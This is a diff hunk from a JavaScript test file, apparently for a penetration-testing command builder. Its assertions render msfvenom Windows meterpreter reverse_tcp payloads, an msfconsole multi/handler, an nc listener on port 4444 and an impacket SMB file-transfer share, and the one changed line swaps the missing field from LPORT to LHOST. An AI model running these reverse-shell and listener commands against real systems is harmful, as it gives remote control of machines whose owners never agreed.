@@ -34,7 +34,7 @@ assert(command('tb-msfvenom',{payload:'windows/x64/meterpreter/reverse_tcp',lhos
 assert(command('tb-msfconsole',{mode:'handler',payload:'windows/x64/meterpreter/reverse_tcp',lhost:'10.10.14.9',lport:'4444',exitOnSession:'false'}).includes('exploit/multi/handler'),'msfconsole handler command must configure the handler');
 assert(command('tb-nc-penelope',{toolChoice:'nc',lport:'4444'}).includes('nc -lvnp 4444'),'nc listener command must be minimal');
 assert(command('tb-file-transfer-helper',{method:'impacket-smbserver',shareName:'share',serveDir:'.',smb2:true}).includes('impacket-smbserver share . -smb2support'),'SMB transfer helper must render');
-assert.throws(()=>command('tb-msfvenom',{payload:'windows/x64/meterpreter/reverse_tcp',lhost:'10.10.14.9',format:'exe',output:'payload.exe'}),/Missing required fields/,'missing LPORT must block fake runnable payload commands');
+assert.throws(()=>command('tb-msfvenom',{payload:'windows/x64/meterpreter/reverse_tcp',lport:'4444',format:'exe',output:'payload.exe'}),/Missing required fields/,'missing LHOST must block fake runnable payload commands');
 
 const inv=ctx.OBOL_TOOL_BUILDER_INVENTORY;
 for(const [tool,id] of Object.entries({linpeas:'tb-linpeas',winpeas:'tb-winpeas',msfvenom:'tb-msfvenom',msfconsole:'tb-msfconsole',nc:'tb-nc-penelope',penelope:'tb-nc-penelope',wget:'tb-file-transfer-helper',certutil:'tb-file-transfer-helper','impacket-smbserver':'tb-file-transfer-helper'})){
